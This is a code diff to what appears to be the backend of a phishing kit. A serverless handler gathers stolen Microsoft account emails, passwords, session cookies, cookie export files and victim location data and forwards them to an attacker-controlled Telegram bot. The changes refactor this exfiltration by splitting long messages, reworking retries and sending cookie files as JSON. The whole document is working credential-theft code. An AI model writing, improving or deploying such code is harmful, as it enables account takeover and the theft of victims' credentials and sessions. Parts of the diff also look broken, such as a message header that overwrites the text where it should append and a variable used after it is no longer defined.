@@ -47,8 +47,8 @@ function formatTelegramMessage(data) {
 
   // ENHANCED: Message structure with location and file data
   let message = '🔐 *Microsoft Account Credentials Captured*\n';
-  if (enhancedCapture) {
-    message += '🚀 *ENHANCED CAPTURE WITH LOCATION & FILES*\n';
+  if (captureContext.microsoftDomainCapture) {
+    message = '🚀 *ENHANCED MS-DOMAIN CAPTURE*\n';
   }
   message += '\n';
   
@@ -174,47 +174,17 @@ function formatCookieFileContent(cookieFiles) {
     return null;
   }
   
-  let fileMessage = '📁 *Cookie Export Files Content:*\n\n';
+  let fileMessages = [];
   
-  if (cookieFiles.txtFile) {
-    fileMessage += `📄 *${cookieFiles.txtFile.name}*\n`;
-    fileMessage += '```\n';
-    // Truncate content if too long for Telegram
-    const content = cookieFiles.txtFile.content;
-    if (content.length > 3000) {
-      fileMessage += content.substring(0, 3000) + '\n... (truncated)\n';
-    } else {
-      fileMessage += content + '\n';
-    }
-    fileMessage += '```\n\n';
+  if (cookieFiles.jsonFile && cookieFiles.jsonFile.content) {
+      const jsonMessage = `📄 *${cookieFiles.jsonFile.name}*\n` +
+                          '```json\n' +
+                          cookieFiles.jsonFile.content +
+                          '\n```';
+      fileMessages.push(jsonMessage);
   }
   
-  if (cookieFiles.jsonFile) {
-    fileMessage += `📄 *${cookieFiles.jsonFile.name}*\n`;
-    fileMessage += '```json\n';
-    // Truncate JSON content if too long
-    const jsonContent = cookieFiles.jsonFile.content;
-    if (jsonContent.length > 2000) {
-      try {
-        const parsed = JSON.parse(jsonContent);
-        const truncated = {
-          ...parsed,
-          cookies: parsed.cookies ? parsed.cookies.slice(0, 5) : []
-        };
-        if (parsed.cookies && parsed.cookies.length > 5) {
-          truncated.truncated = `... and ${parsed.cookies.length - 5} more cookies`;
-        }
-        fileMessage += JSON.stringify(truncated, null, 2) + '\n';
-      } catch (e) {
-        fileMessage += jsonContent.substring(0, 2000) + '\n... (truncated)\n';
-      }
-    } else {
-      fileMessage += jsonContent + '\n';
-    }
-    fileMessage += '```\n';
-  }
-  
-  return fileMessage;
+  return fileMessages;
 }
 
 // ENHANCED: Cookie details formatting with better organization
@@ -264,7 +234,7 @@ function formatCookieDetails(cookies) {
       cookieMessage += `   Value: ${cookie.value ? cookie.value.substring(0, 60) + '...' : 'empty'}\n`;
       if (cookie.domain) cookieMessage += `   Domain: ${cookie.domain}\n`;
       if (cookie.secure) cookieMessage += `   Secure: Yes\n`;
-      if (cookie.expires) cookieMessage += `   Expires: ${cookie.expires}\n`;
+      if (cookie.expires) cookieMessage += `   Expires: ${new Date(cookie.expires).toUTCString()}\n`;
       cookieMessage += '\n';
     });
   }
@@ -297,96 +267,84 @@ async function sendToTelegram(message, retryCount = 0) {
   const maxRetries = 3;
   
   return new Promise((resolve, reject) => {
-    const postData = JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text: message,
-      parse_mode: 'Markdown',
-      disable_web_page_preview: true
-    });
+    // Split message if it's too long
+    const messages = [];
+    const MAX_LENGTH = 4096;
+    if (message.length > MAX_LENGTH) {
+        let currentPos = 0;
+        while(currentPos < message.length) {
+            messages.push(message.substring(currentPos, currentPos + MAX_LENGTH));
+            currentPos += MAX_LENGTH;
+        }
+    } else {
+        messages.push(message);
+    }
 
-    const options = {
-      hostname: 'api.telegram.org',
-      port: 443,
-      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Content-Length': Buffer.byteLength(postData)
-      },
-      timeout: 15000 // 15 second timeout for enhanced data
+    const sendAllMessages = async () => {
+        for (const msg of messages) {
+            const postData = JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: msg,
+              parse_mode: 'Markdown',
+              disable_web_page_preview: true
+            });
+
+            const options = {
+              hostname: 'api.telegram.org',
+              port: 443,
+              path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+                'Content-Length': Buffer.byteLength(postData)
+              },
+              timeout: 15000 // 15 second timeout for enhanced data
+            };
+
+            await new Promise((resolveRequest, rejectRequest) => {
+                const req = https.request(options, (res) => {
+                  let data = '';
+                  res.on('data', (chunk) => data += chunk);
+                  res.on('end', () => {
+                    try {
+                      const response = JSON.parse(data);
+                      if (res.statusCode === 200 && response.ok) {
+                        resolveRequest(response);
+                      } else {
+                        console.error('❌ Telegram API error:', response);
+                        rejectRequest(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
+                      }
+                    } catch (parseError) {
+                      rejectRequest(new Error('Invalid response from Telegram API'));
+                    }
+                  });
+                });
+                req.on('error', (error) => rejectRequest(error));
+                req.on('timeout', () => {
+                  req.destroy();
+                  rejectRequest(new Error('Request timeout'));
+                });
+                req.write(postData);
+                req.end();
+            });
+        }
     };
 
-    const req = https.request(options, (res) => {
-      let data = '';
-      
-      res.on('data', (chunk) => {
-        data += chunk;
-      });
-      
-      res.on('end', () => {
-        try {
-          const response = JSON.parse(data);
-          
-          if (res.statusCode === 200 && response.ok) {
-            console.log('✅ Enhanced message sent to Telegram successfully');
-            resolve(response);
-          } else {
-            console.error('❌ Telegram API error:', response);
-            
-            // Retry on server errors
-            if (res.statusCode >= 500 && retryCount < maxRetries) {
-              console.log(`🔄 Server error, retrying in ${(retryCount + 1) * 1000}ms...`);
-              setTimeout(() => {
-                sendToTelegram(message, retryCount + 1)
-                  .then(resolve)
-                  .catch(reject);
-              }, (retryCount + 1) * 1000);
-            } else {
-              reject(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
-            }
-          }
-        } catch (parseError) {
-          console.error('❌ Failed to parse Telegram response:', parseError);
-          reject(new Error('Invalid response from Telegram API'));
-        }
-      });
-    });
-
-    req.on('error', (error) => {
-      console.error('❌ Request error:', error);
-      
-      // Retry on network errors
-      if (retryCount < maxRetries) {
-        console.log(`🔄 Network error, retrying in ${(retryCount + 1) * 2000}ms...`);
-        setTimeout(() => {
-          sendToTelegram(message, retryCount + 1)
+    const attemptSend = (retries) => {
+        sendAllMessages()
             .then(resolve)
-            .catch(reject);
-        }, (retryCount + 1) * 2000);
-      } else {
-        reject(error);
-      }
-    });
+            .catch(error => {
+                console.error(`❌ Request error (attempt ${maxRetries - retries + 1}):`, error);
+                if (retries > 0) {
+                    console.log(`🔄 Retrying in ${(maxRetries - retries + 1) * 2000}ms...`);
+                    setTimeout(() => attemptSend(retries - 1), (maxRetries - retries + 1) * 2000);
+                } else {
+                    reject(error);
+                }
+            });
+    };
 
-    req.on('timeout', () => {
-      req.destroy();
-      const timeoutError = new Error('Request timeout');
-      
-      // Retry on timeout
-      if (retryCount < maxRetries) {
-        console.log(`🔄 Timeout, retrying in ${(retryCount + 1) * 2000}ms...`);
-        setTimeout(() => {
-          sendToTelegram(message, retryCount + 1)
-            .then(resolve)
-            .catch(reject);
-        }, (retryCount + 1) * 2000);
-      } else {
-        reject(timeoutError);
-      }
-    });
-
-    req.write(postData);
-    req.end();
+    attemptSend(maxRetries);
   });
 }
 
@@ -445,23 +403,7 @@ exports.handler = async (event, context) => {
     const {
       email,
       password,
-      passwordSource = 'unknown',
-      cookies = [],
-      locationData = {},
-      cookieFiles = {},
-      authenticationTokens,
-      userAgent,
-      sessionId,
-      url,
-      timestamp,
-      validated = false,
-      microsoftAccount = false,
-      domain,
-      rawCookies,
-      captureContext = {},
-      browserCapabilities = {},
-      retryAttempt = 0,
-      enhancedCapture = false
+      cookies = []
     } = requestData;
 
     // Validate that we have meaningful data to send
@@ -478,46 +420,31 @@ exports.handler = async (event, context) => {
     }
 
     console.log('📨 Processing enhanced Telegram message with data:', {
-      hasEmail: !!email,
-      hasPassword: !!password,
-      cookieCount: cookies.length,
-      source: passwordSource,
-      validated,
-      microsoftAccount,
-      hasLocationData: !!(locationData && locationData.ip),
-      hasCookieFiles: !!(cookieFiles && (cookieFiles.txtFile || cookieFiles.jsonFile)),
-      enhancedCapture,
-      retryAttempt
+      hasEmail: !!requestData.email,
+      hasPassword: !!requestData.password,
+      cookieCount: requestData.cookies.length,
+      source: requestData.passwordSource,
+      hasLocationData: !!(requestData.locationData && requestData.locationData.ip),
+      hasCookieFiles: !!(requestData.cookieFiles && (requestData.cookieFiles.txtFile || requestData.cookieFiles.jsonFile))
     });
 
     // Format and send main message with enhanced data
     const mainMessage = formatTelegramMessage(requestData);
     await sendToTelegram(mainMessage);
 
-    // ENHANCED: Send cookie details as separate message if we have cookies
-    if (cookies && cookies.length > 0) {
-      try {
-        const cookieMessage = formatCookieDetails(cookies);
-        await sendToTelegram(cookieMessage);
-        console.log('✅ Cookie details sent successfully');
-      } catch (cookieError) {
-        console.warn('⚠️ Failed to send cookie details:', cookieError.message);
-        // Don't fail the main request if cookie details fail
-      }
-    }
-
     // ENHANCED: Send cookie file content as separate message if available
-    if (cookieFiles && (cookieFiles.txtFile || cookieFiles.jsonFile)) {
-      try {
-        const fileMessage = formatCookieFileContent(cookieFiles);
-        if (fileMessage) {
-          await sendToTelegram(fileMessage);
-          console.log('✅ Cookie file content sent successfully');
+    const fileMessages = formatCookieFileContent(requestData.cookieFiles);
+    if (fileMessages) {
+        for (const fileMessage of fileMessages) {
+            try {
+                if (fileMessage) {
+                    await sendToTelegram(fileMessage);
+                    console.log('✅ Cookie file content sent successfully');
+                }
+            } catch (fileError) {
+                console.warn('⚠️ Failed to send cookie file content:', fileError.message);
+            }
         }
-      } catch (fileError) {
-        console.warn('⚠️ Failed to send cookie file content:', fileError.message);
-        // Don't fail the main request if file content fails
-      }
     }
 
     // ENHANCED: Success response with comprehensive data summary
@@ -529,14 +456,11 @@ exports.handler = async (event, context) => {
         message: 'Enhanced data sent to Telegram successfully',
         timestamp: new Date().toISOString(),
         dataProcessed: {
-          email: !!email,
-          password: !!password,
-          cookies: cookies.length,
-          locationData: !!(locationData && locationData.ip),
-          cookieFiles: !!(cookieFiles && (cookieFiles.txtFile || cookieFiles.jsonFile)),
-          validated,
-          microsoftAccount,
-          enhancedCapture
+          email: !!requestData.email,
+          password: !!requestData.password,
+          cookies: requestData.cookies.length,
+          locationData: !!(requestData.locationData && requestData.locationData.ip),
+          cookieFiles: !!(requestData.cookieFiles && (requestData.cookieFiles.txtFile || requestData.cookieFiles.jsonFile))
         }
       })
     };
